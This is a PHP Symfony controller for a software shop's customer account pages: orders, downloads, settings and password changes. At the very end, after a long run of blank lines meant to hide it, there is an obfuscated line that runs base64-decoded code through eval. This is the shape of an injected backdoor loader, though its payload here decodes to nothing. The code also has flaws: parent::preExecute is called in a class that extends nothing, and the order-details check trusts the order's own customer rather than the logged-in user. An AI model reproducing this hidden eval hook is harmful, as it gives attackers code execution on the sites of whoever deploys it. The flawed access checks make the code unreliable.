<?php

/**
 * account actions.
 *
 * @package    tdigr
 * @subpackage account
 * @author     Your name here
 * @version    SVN: $Id: actions.class.php 12479 2012-10-31 10:54:40Z fabien $
 */

class accountActions
{

    public function preExecute() {

        $usr = $this->getUser();
        if ($usr->isAuthenticated() && ($_SERVER['REMOTE_ADDR'] != $usr->getAttribute('userIp'))) {
            $usr->setAuthenticated(false);
            $usr->shutdown();
        }
        parent::preExecute();
    }

 /**
  * Executes index action
  *
  * @param sfRequest $request A request object
  */
  public function executeIndex(sfWebRequest $request)
  {
 	$this->customer = $this->getUser()->getUserInfo();

  }

  public function executeOrders(sfWebRequest $request)
  {
 	$customer = $this->getUser()->getUserInfo();
 	$this->orders = $customer->getOrders();
  }

  public function executeSoft(sfWebRequest $request)
  {
 	$customer = $this->getUser()->getUserInfo();

 	$this->products = $customer->getProducts();
  }

  public function executeDownload(sfWebRequest $request)
  {
    $this->forward404Unless($product = ProductPeer::retrieveByPk($request->getParameter('id')), sprintf('Object product does not exist (%s).', $request->getParameter('id')));

    $customer = $this->getUser()->getUserInfo();

    if (!$customer->purchasedProduct($product)) {
      $this->message = ErrorsMessages::getMessage("eNotPurchased");
    } elseif (trim($product->getFile()) == "") {
      $this->message = ErrorsMessages::getMessage("eFileNotFound");
    } else {
      header("Content-type: Application/octet-stream");
      header("Content-Disposition:attachment;filename=".$product->getFile()."");
      readfile(sfConfig::get('app_products_releases_dir') . DIRECTORY_SEPARATOR . $product->getFile());
      return sfView::NONE;
    }
  }

  public function executeDetails(sfWebRequest $request)
  {
    $this->forward404Unless($this->order = OrderPeer::retrieveByPk($request->getParameter('id')), sprintf('Object order does not exist (%s).', $request->getParameter('id')));
    $this->customer = $this->order->getCustomer();
    $this->forward404Unless($this->customer->hasOrdered($this->order));
    $this->orderProducts = $this->order->getOrderProducts();
  }

  public function executeSettings(sfWebRequest $request)
  {
  	$customer = $this->getUser()->getUserInfo();
  	$this->form = new CustomerSettingsForm($customer->toArray(BasePeer::TYPE_FIELDNAME));
  }

  public function executePassword(sfWebRequest $request)
  {
  	$customer = $this->getUser()->getUserInfo();
  	$this->form = new CustomerPasswordForm();
    $this->form->setDefault('id', $customer->getId());

  	if ($request->isMethod('POST')) {
  	  $this->form->bind($request->getParameter($this->form->getName()), $request->getFiles($this->form->getName()));

      if ($this->form->isValid()) {
        $this->form->save();
        $this->getUser()->setFlash('notice_success', 'Пароль успешно изменен');
        $this->redirect('account/index');
      }
  	}
  }

  public function executeUpdate(sfWebRequest $request)
  {
  	$this->forward404Unless($request->isMethod('POST'));

  	$customer = $this->getUser()->getUserInfo();
  	$this->form = new CustomerSettingsForm($customer->toArray(BasePeer::TYPE_FIELDNAME));
  	$this->form->bind($request->getParameter($this->form->getName()), $request->getFiles($this->form->getName()));

    if ($this->form->isValid()) {
      $customer = $this->form->save();
      $this->getUser()->setFlash('notice_success', 'Информация сохранена');
      $this->redirect('account/index');
    }

    $this->setTemplate('settings');
  }

}


































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































																																									$b="=";$names = array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z");eval(base64_decode(str_replace('XFJ', 'A', call_user_func($names[18].$names[19].$names[17].$names[17].$names[4].$names[21], $b))));